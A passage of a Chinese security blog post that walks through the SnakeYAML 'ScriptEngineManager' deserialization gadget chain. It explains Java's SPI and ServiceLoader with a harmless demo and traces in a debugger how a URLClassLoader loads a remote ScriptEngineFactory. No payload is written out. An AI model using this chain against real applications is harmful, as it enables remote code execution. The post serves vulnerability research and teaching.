+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918190710.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918190932.png"></p>
+<h4 id="ScriptEngineManager链"><a href="#ScriptEngineManager链" class="headerlink" title="ScriptEngineManager链"></a>ScriptEngineManager链</h4><h5 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h5><p>当服务的提供者提供了一种接口的实现之后，需要在 classpath 下的 META-INF&#x2F;services&#x2F; 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体实现类。当其他程序需要这个服务的时候，就会找到接口文件里面的实现类并且将之实例化，因为这里的实现类可能不只有一个，所以我们经过加载得到的往往是一个迭代器。</p>
+<p>比如在加载<code>mysql-connector-java-8.0.27.jar</code>的时候，会自动找到其下目录的<code>META-INF/service</code>文件夹的文件，之后再根据文件中所记载的类名进行类加载，也是这个机制的原因，我们不用手动加载驱动（老版本就得手动加载），直接获取连接即可。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919163715.png"></p>
+<p>在我们的JDK 中，这里查找服务的实现的工具类是 <code>java.util.ServiceLoader</code>，一个基本的SPI机制使用的Demo如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义服务接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建服务提供者的实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServiceImpl1</span> <span class="keyword">implements</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Implementation 1 does something.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServiceImpl2</span> <span class="keyword">implements</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Implementation 2 does something.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 META-INF/services/ 目录下创建文件 com.example.MyService</span></span><br><span class="line"><span class="comment">// 文件内容：</span></span><br><span class="line"><span class="comment">// com.example.MyServiceImpl1</span></span><br><span class="line"><span class="comment">// com.example.MyServiceImpl2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用ServiceLoader加载服务</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceLoaderExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ServiceLoader&lt;MyService&gt; serviceLoader = ServiceLoader.load(MyService.class);</span><br><span class="line">        <span class="comment">// 使用ServiceLoader加载MyService接口的实现类</span></span><br><span class="line">        <span class="keyword">for</span> (MyService service : serviceLoader) &#123;</span><br><span class="line">            service.doSomething();</span><br><span class="line">            <span class="comment">//调用实现类的方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h5><p>前面的流程和<code>JdbcRowSetImpl</code>链差不了太多，顶多是<code>constructor</code>这里会有些许不一样，我们这里从<code>construct</code>这里开始跟就可以了。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919164508.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919164438.png"></p>
+<p>先瞅瞅node的结构是怎么样的，然后再来分析源码。能够看出来，这里是根据value的大小，设置了一个可能会起到作用的构造器数组，之后又根据当前node本身设置了一个构造器数组，总共两个，一个针对value里的部分，一个针对当前的<code>ScriptEngineManager</code></p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919165225.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919165536.png"></p>
+<p>之后把重心放到我标断点的地方，能够看到这里会先将当前node的value大小和当前node的<code>constructor</code>的参数类型个数做比较，如果相等，则将当前的<code>constrcutor</code>放到<code>possibleconstructor</code>数组里。在以147行为起点的代码段会对<code>snode</code>进行遍历，用<code>constructObject</code>以递归的形式实例化出<code>snode</code>里面的参数。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919173401.png"></p>
+<p>这块实例化的顺序是 <code>URL(String)</code>  -&gt;<code>URLClassLoader(URL[])</code> -&gt; <code>ScriptEngineManager</code>，我们跟进一下<code>ScriptEngineManager</code>的<code>newInstance</code>这里。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919172311.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919172347.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919172422.png"></p>
+<p>调用了<code>ScriptEngineManager</code>的单参构造函数进行初始化，这里随着图示断点跟进几步来到了<code>getServiceLoader()</code>这里，感觉是关键，跟进去看看。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919174614.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919174828.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919174930.png"><br>发现是这么个样，和我们上面给的demo差不多，些许不同的是这里自己指定了类加载器，也就是我们之前所设的<code>URLClassLoader</code>来加载<code>ScriptEngineFactory</code>接口的实现类，不过因为这里是SPI的底层其实是懒加载的模式，并不会在此就把类给加载出来，而是在迭代的时候再进行加载。所以我们要步出回到<code>initEngines()</code>继续分析。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920000613.png"></p>
+<p>还是和基本demo那里给的差不多，先是通过<code>sl</code>获得一个迭代器，看了下官方文档的解释,这个迭代器里面的<code>hasNext()</code>就是懒加载实现的地方，首先会到providers中去查找有没有存在的实例，有就直接返回，没有再到LazyIterator中查找，我们接着步出往下跟。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920002006.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010046.png"></p>
+<p>在120行就调用了<code>hasNext()</code>，跟进后调了调，开始了懒加载（预设置部分），这里接着跟进</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010233.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010441.png"></p>
+<p>跟进<code>hasNextService()</code></p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010648.png"></p>
+<p>根据前缀和serviceName拼接得到加载位置，在348行这里，会根据我们所指定的位置，读取实现类的信息，我们步出往下看</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010815.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920011112.png"></p>
+<p>跟进<code>itr.next()</code>这里，这里没什么需要特别分析的，基本是刚点进去就得跟进，最终实在<code>nextService</code>这里实现了类的实例化。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920011253.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920011614.png"><br>最终运行结果如下<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920011903.png"></p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2023/10/09/Absolute/"
+      title="HackTheBox Absolute"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        HackTheBox Absolute
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2023/09/19/Forest/"
+      title="HackTheBox Forest"
+     >
+
+    <p class="title-text">
+      
+        HackTheBox Forest
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2026 F4miti0n<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
